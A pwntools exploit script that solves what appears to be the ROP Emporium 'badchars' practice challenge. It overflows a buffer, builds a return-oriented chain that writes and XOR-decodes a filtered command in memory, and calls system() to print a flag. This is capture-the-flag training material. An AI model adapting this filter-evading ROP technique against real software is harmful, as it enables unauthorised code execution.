from pwn import *

context(terminal=['tmux','new-window'],os='linux',arch='amd64')
# p = gdb.debug('./badchars', 'b *0x004009dd')
p = process('./badchars')

def write_that_there(that,there):
    there = p64(there)
    payload = b''
    payload += pop_r12_r13
    payload += that
    payload += there
    payload += mov_r13_r12
    return payload

def xor_that_there(that,there):
    that = p64(that)
    there = p64(there)
    payload = b''
    payload += pop_r14_r15
    payload += that
    payload += there
    payload += xor_r15_r14
    return payload

def xor_chars(string):
    to_xor = b''
    valid_string = b''
    for char in string:
        n = char
        for i in range(256):
            new_char = chr(n^i).encode()
            if new_char not in badchars:
                valid_string += new_char
                to_xor += chr(i).encode()
                break
    return (valid_string,to_xor)
    
badchars = b'bic/ fns'

padding = b'A'*40
system = p64(0x4006f0)
exit = p64(0x400770)
cmd = b'cat flag.txt'.ljust(16,b'\0')
data_int = 0x601078
mov_r13_r12 = p64(0x400b34)
pop_r12_r13 = p64(0x400b3b)
xor_r15_r14 = p64(0x400b30)
pop_r14_r15 = p64(0x400b40)
pop_rdi = p64(0x400b39)

payload = padding

for i in range(0,len(cmd),8):
    word,to_xor = xor_chars(cmd[i:i+8])
    payload += write_that_there(word,data_int+i)
    for j,c in enumerate(to_xor):
        if c != 0:
            payload += xor_that_there(c,data_int+i+j)

payload += pop_rdi
payload += p64(data_int)
payload += system
payload += exit

# for i in range(0,len(payload),8):
#     print(hex(u64(payload[i:i+8])))

p.sendline(payload)
p.recvline()
p.recvline()
p.recvline()
p.recvline()
print(p.recvall().decode())
